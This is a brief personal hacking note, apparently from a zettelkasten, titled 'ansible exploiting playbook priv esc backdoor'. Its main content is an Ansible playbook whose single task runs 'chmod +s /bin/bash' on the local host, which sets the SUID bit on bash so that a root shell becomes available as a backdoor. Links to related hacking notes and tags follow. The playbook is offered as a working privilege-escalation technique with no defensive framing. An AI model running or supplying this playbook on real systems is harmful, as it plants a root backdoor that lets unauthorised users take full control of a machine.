# ansible exploiting playbook priv esc backdoor
```yaml
- name: "whatever"
  hosts: localhost
  connection: local
  tasks:
    - name: "whatever"
      shell: "chmod +s /bin/bash"
      register: "output"
```

` zet/20221003150336/README.md `

# Related

- [20221014190054](/zet/20221014190054/README.md) kb file named kb/hacking/misc/ansible.md
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub
- [20221003150338](/zet/20221003150338/README.md) ansible exploiting playbook
- ~/kb/hacking/misc/ansible.md

Tags:

    #hacking #ansible 
